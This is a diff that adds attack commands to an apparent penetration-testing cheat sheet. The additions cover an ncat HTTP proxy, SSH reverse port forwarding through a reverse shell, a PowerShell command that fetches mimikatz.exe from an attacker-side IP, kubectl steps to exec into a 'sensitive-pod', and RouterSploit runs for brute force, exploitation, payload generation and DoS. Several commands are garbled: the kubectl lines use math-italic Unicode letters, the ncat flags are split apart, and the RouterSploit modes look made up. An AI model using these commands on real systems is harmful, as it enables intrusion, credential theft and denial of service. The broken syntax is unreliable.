@@ -160,6 +160,12 @@ Start Listener:
 $ nc -1 -p [port]
 ```
 
+### Start HTTP SOCKS server at Automation-Server
+
+```
+./ncat - l 3128 -proxy -type http &
+```
+
 ### Scan ports
 
 ```text
@@ -298,6 +304,13 @@ Port forwarding must be allowed on the target
 
 ```text
 ssh root@2.2.2.2 -p 8222
+```
+
+### Reverse port forwarding using the tunnel (in the support user reverse shell)
+
+```
+ssh -R 4446:127.0.0.1:3128 master@192.168.2.2
+http 127.0.0.1 4446
 ```
 
 ### Set x11 victim to attacker
@@ -958,6 +971,102 @@ crackmapexec smb <IP> -u <USER> -p <PASS> --shares
 ```text
 mssqlclient.py -port 1433 sa@10.10.10.10
 ```
+
+## powershell download files
+
+```
+powershell iwr -usebasicparsing http://192.168.2.2/mimikatz.exe -OutFile mimikatz.exe
+
+```
+
+## List of Pods
+
+```
+𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑔𝑒𝑡 𝑝𝑜𝑑
+```
+
+## Check if you have rights to exec into any pods
+
+```
+./𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑎𝑢𝑡ℎ 𝑐𝑎𝑛 − 𝑖 𝑒𝑥𝑒𝑐 𝑝𝑜𝑑𝑠
+```
+
+## exec into sensitive-pod
+
+```
+./𝑘𝑢𝑏𝑒𝑐𝑡𝑙 𝑒𝑥𝑒𝑐 − 𝑖𝑡 𝑠𝑒𝑛𝑠𝑖𝑡𝑖𝑣𝑒 − 𝑝𝑜𝑑 /𝑏𝑖𝑛/𝑏𝑎𝑠ℎ
+```
+
+## More information about the environment
+
+```
+kubectl get nodes -o wide
+```
+
+
+## RouterSploit
+
+### Discover Devices
+
+```
+python rsf.py -m discovery
+```
+
+### Scan for vulnerabilities
+
+```
+python rsf.py -m vulnerability
+```
+
+
+### Brute Force
+
+```
+python rsf.py -m bruteforce
+```
+
+
+### Exploit vulnerabilities
+
+```
+python rsf.py -m exploit
+```
+
+
+### Generate Payloads
+
+```
+python rsf.py -m payloads
+```
+
+
+### Sniffing
+
+```
+python rsf.py -m sniffer
+```
+
+
+### Dos Attacks
+
+```
+python rsf.py -m dos
+```
+
+### Password Attacks
+
+```
+python rsf.py -m password
+```
+
+### Shodan Integration
+
+```
+python rsf.py -m shodan
+```
+
+
+
 
 
 {% include links.html %}
